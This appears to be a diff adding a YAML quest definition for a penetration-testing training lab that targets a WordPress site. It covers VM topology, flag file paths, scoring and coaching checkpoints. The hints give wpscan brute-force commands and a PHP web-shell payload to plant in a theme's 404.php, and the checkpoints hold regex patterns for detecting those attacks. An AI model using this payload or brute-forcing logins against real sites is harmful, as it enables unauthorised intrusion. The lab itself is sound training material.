@@ -1,0 +1,77 @@
+apiVersion: pentrain/v1
+kind: Quest
+meta:
+  id: web-t2-wordpress
+  track: web-appsec
+  tier: 2
+  title: "Pressing Matters"
+  version: 1
+display:
+  tagline: "A corporate WordPress with a guessable admin password — wpscan exists for a reason. Theme editor, then the flag."
+requirements:
+  min_ram_gb: 12
+  min_vcpus: 6
+  min_disk_gb: 90
+  est_deploy_min: 15
+topology:
+  kali:
+    template: kali-x64-desktop-template
+    ram_gb: 6
+    cpus: 4
+  vms:
+    - name: wp01
+      template: debian-12-x64-server-template
+      ram_gb: 4
+      cpus: 2
+      vlan: 10
+      ip_last_octet: 33
+      roles: [pentrain_docker_host, pentrain_web_t2_wordpress]
+flags:
+  - id: uploads-flag
+    name: "Uploads flag — found by thorough enumeration"
+    kind: file
+    points: 150
+    vm: wp01
+    container: wordpress
+    file_path: /var/www/html/wp-content/uploads/flag.txt
+  - id: rce-flag
+    name: "RCE flag — outside the web root, shell required"
+    kind: file
+    points: 300
+    vm: wp01
+    container: wordpress
+    file_path: /flag.txt
+hints:
+  - id: h1
+    cost: 30
+    stage: recon
+    text: "wpscan --url http://<ip> --enumerate u — user enumeration first. Check what plugins/themes it fingerprints, and look at /wp-content/uploads/."
+  - id: h2
+    cost: 50
+    stage: exploit
+    text: "wpscan --url http://<ip> -U admin -P /usr/share/wordlists/metasploit/unix_passwords.txt — or go bigger with rockyou (gzipped, decompress first)."
+  - id: h3
+    cost: 70
+    stage: exploit
+    text: "wp-admin → Appearance → Theme File Editor → 404.php — drop <?php system($_GET['c']); ?> in, trigger any 404, and you've got RCE. The flag sits at the container root."
+coach:
+  briefing_ref: coach_context.md
+  checkpoints:
+    - id: cp-enum
+      name: "Enumerated WordPress"
+      detect: { command_match: "(wpscan|wp-content|wp-admin|wp-login|xmlrpc)" }
+      hint_after_s: 600
+    - id: cp-brute
+      name: "Attacked the login"
+      detect: { command_match: "(wpscan.*-P|hydra|wp-login|xmlrpc.*user)" }
+      hint_after_s: 720
+    - id: cp-rce
+      name: "Achieved code execution"
+      detect: { command_match: "(404\\.php|theme.*edit|cmd=|system\\(|/flag)" }
+      hint_after_s: 720
+  escalation: { observe_grace_s: 120, nudge_s: 480, hint_s: 840 }
+scoring:
+  base: 500
+  time_bonus_max: 200
+  par_s: 1800
+  takeover_cost: 150
